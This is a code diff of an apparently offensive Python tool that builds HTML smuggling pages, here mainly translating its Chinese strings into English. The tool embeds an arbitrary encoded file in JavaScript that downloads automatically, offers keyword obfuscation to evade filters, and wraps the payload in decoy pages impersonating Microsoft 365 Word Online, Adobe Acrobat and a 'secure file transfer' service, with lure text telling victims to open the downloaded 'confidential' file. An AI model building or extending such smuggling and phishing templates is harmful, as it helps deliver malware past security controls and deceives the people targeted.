@@ -7,7 +7,7 @@ from config import OUTPUT_DIR
 
 
 class JSObfuscator:
-    """JS 关键词规避：将敏感关键词替换为 String.fromCharCode 动态构造"""
+    """JS keyword evasion: replace sensitive keywords with String.fromCharCode dynamic construction"""
 
     @staticmethod
     def _to_char_code(s):
@@ -42,7 +42,7 @@ class HTMLGenerator:
     def generate_js_payload(self, file_path, download_name, mode, encoding_method="Standard Base64", key_length=16, chunk_size=4096, enable_evasion=False):
         """
         Generates the JS payload for smuggling.
-        mode: "自动下载" / "点击任意位置下载" / "Embedded" (for SVG reuse)
+        mode: "auto_download" / "click_anywhere" / "Embedded" (for SVG reuse)
         Returns (smuggling_code, meta_tags, extra_files)
         """
         if not file_path or not os.path.exists(file_path):
@@ -61,7 +61,7 @@ class HTMLGenerator:
             meta_tags = self._get_meta_tags(key_hex)
 
         # --- Build JS based on trigger mode ---
-        if "点击任意位置" in mode or "ClickAnywhere" in mode:
+        if "click_anywhere" in mode or "ClickAnywhere" in mode:
             # Click Anywhere Download Mode
             smuggling_code = f"""
             (function(){{
@@ -115,11 +115,11 @@ class HTMLGenerator:
         return smuggling_code, meta_tags, extra_files
 
     def generate(self, file_path, image_url, download_name, mode, encoding_method="Standard Base64", key_length=16, chunk_size=4096, 
-                 decoy_type="无 (None)", custom_template_path=None, enable_evasion=False):
+                 decoy_type="None", custom_template_path=None, enable_evasion=False):
         """
         Generates HTML Smuggling file.
-        mode: "自动下载" / "点击任意位置下载"
-        decoy_type: "无 (None)" / "Microsoft 365 文档预览" / "Adobe PDF在线查看" / "文件下载中 (File Download)" / "自定义 (Custom)"
+        mode: "auto_download" / "click_anywhere"
+        decoy_type: "None" / "Microsoft 365 Document Preview" / "Adobe PDF Online Viewer" / "File Download" / "Custom"
         """
         if not download_name:
             raise ValueError("Download filename is required.")
@@ -137,29 +137,29 @@ class HTMLGenerator:
             if "Microsoft 365" in decoy_type:
                 html_content = self._get_m365_template(smuggling_code, meta_tags)
             
-            # 3. Adobe PDF decoy
+            # 2. Adobe PDF decoy
             elif "Adobe PDF" in decoy_type:
                 html_content = self._get_adobe_template(smuggling_code, meta_tags)
             
-            # 4. File Download decoy
-            elif "文件下载" in decoy_type or "File Download" in decoy_type:
+            # 3. File Download decoy
+            elif "File Download" in decoy_type:
                 html_content = self._get_download_template(smuggling_code, meta_tags)
             
-            # 5. Custom template
-            elif "自定义" in decoy_type or "Custom" in decoy_type:
+            # 4. Custom template
+            elif "Custom" in decoy_type:
                 if not custom_template_path:
-                    raise ValueError("请选择自定义模板文件 (Custom template file is required)")
+                    raise ValueError("Custom template file is required")
                 if not os.path.exists(custom_template_path):
-                    raise ValueError(f"自定义模板文件不存在: {custom_template_path}")
+                    raise ValueError(f"Custom template file not found: {custom_template_path}")
                 html_content = self._get_custom_template(custom_template_path, smuggling_code, meta_tags)
             
-            # 6. Default: None → minimal HTML
+            # 5. Default: None -> minimal HTML
             else:
                 html_content = f"""<!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>下载</title>
+    <title>Download</title>
     {meta_tags}
     <style>body {{ display:none; }}</style>
 </head>
@@ -293,9 +293,9 @@ class HTMLGenerator:
 
     def _get_m365_template(self, smuggling_code, meta_tags):
         return f"""<!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-<title>Word 在线 - 文档.docx</title>
+<title>Word Online - Document.docx</title>
 {meta_tags}
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
@@ -339,28 +339,29 @@ body {{ font-family:'Segoe UI',sans-serif; background:#f3f2f1; }}
 <body>
 <div class="header">
     <div class="header-logo">&#9679; Word</div>
-    <div class="header-title">文档.docx - 已保存到 OneDrive</div>
+    <div class="header-title">Document.docx - Saved to OneDrive</div>
 </div>
 <div class="toolbar">
-    <span>文件</span><span>开始</span><span>插入</span>
-    <span>布局</span><span>审阅</span><span>视图</span>
+    <span>File</span><span>Home</span><span>Insert</span>
+    <span>Layout</span><span>Review</span><span>View</span>
 </div>
 
 <div class="loading-overlay" id="overlay">
     <div class="spinner"></div>
-    <div class="loading-text">正在打开文档...</div>
+    <div class="loading-text">Opening document...</div>
     <div class="done-text" id="done">
-        ✓ 文档已下载，请从下载文件夹中打开文件。
+        ✓ Document downloaded. Please open the file from your Downloads folder.
     </div>
 </div>
 
 <div class="container">
     <div class="page">
         <div class="doc-content">
-            <h1>季度工作报告</h1>
-            <p>本文档包含机密信息。如果文档无法正常显示，
-            系统已自动将文件保存至您的下载文件夹。</p>
-            <p>请检查下载文件夹并直接打开文件。</p>
+            <h1>Quarterly Business Report</h1>
+            <p>This document contains confidential information. If the document
+            does not display properly, the file has been automatically saved
+            to your Downloads folder.</p>
+            <p>Please check your Downloads folder and open the file directly.</p>
         </div>
     </div>
 </div>
@@ -385,9 +386,9 @@ setTimeout(function(){{
 
     def _get_adobe_template(self, smuggling_code, meta_tags):
          return f"""<!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-<title>Adobe Acrobat - 查看 PDF</title>
+<title>Adobe Acrobat - View PDF</title>
 {meta_tags}
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
@@ -423,14 +424,14 @@ body {{ font-family:'Adobe Clean',Helvetica,sans-serif; background:#1c1c1c; }}
 </div>
 <div class="viewer">
     <div class="pdf-icon">&#128196;</div>
-    <div class="message">正在准备文档预览...</div>
-    <div class="sub-message">文件正在处理中，将自动下载。</div>
-    <div class="download-notice" id="notice">正在下载加密文档...</div>
+    <div class="message">Preparing document preview...</div>
+    <div class="sub-message">The file is being processed and will download automatically.</div>
+    <div class="download-notice" id="notice">Downloading encrypted document...</div>
 </div>
 <script>
 {smuggling_code}
 setTimeout(function(){{
-    document.getElementById('notice').textContent = '✓ 下载完成，请检查下载文件夹。';
+    document.getElementById('notice').textContent = '✓ Download complete. Please check your Downloads folder.';
     document.getElementById('notice').style.background = '#107c10';
     document.getElementById('notice').style.animation = 'none';
 }},4000);
@@ -440,9 +441,9 @@ setTimeout(function(){{
 
     def _get_download_template(self, smuggling_code, meta_tags):
         return f"""<!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-<title>安全文件传输</title>
+<title>Secure File Transfer</title>
 {meta_tags}
 <style>
 * {{ margin:0; padding:0; }}
@@ -476,15 +477,15 @@ body {{
 <div class="card">
     <div id="loading">
         <div class="icon">&#128274;</div>
-        <div class="title">安全文件传输</div>
-        <div class="desc">正在为您准备加密文档下载。</div>
+        <div class="title">Secure File Transfer</div>
+        <div class="desc">Preparing encrypted document for download.</div>
         <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
-        <div class="status" id="status">解密中... 0%</div>
+        <div class="status" id="status">Decrypting... 0%</div>
     </div>
     <div class="done" id="complete">
         <div class="check">&#10003;</div>
-        <div class="title">下载完成</div>
-        <div class="desc">文件已保存到您的下载文件夹。</div>
+        <div class="title">Download Complete</div>
+        <div class="desc">The file has been saved to your Downloads folder.</div>
     </div>
 </div>
 <script>
@@ -495,7 +496,7 @@ var prog = setInterval(function(){{
     pct += Math.random() * 15;
     if (pct > 100) pct = 100;
     document.getElementById('progress').style.width = pct + '%';
-    document.getElementById('status').textContent = '解密中... ' + Math.floor(pct) + '%';
+    document.getElementById('status').textContent = 'Decrypting... ' + Math.floor(pct) + '%';
     if (pct >= 100) {{
         clearInterval(prog);
         setTimeout(function(){{
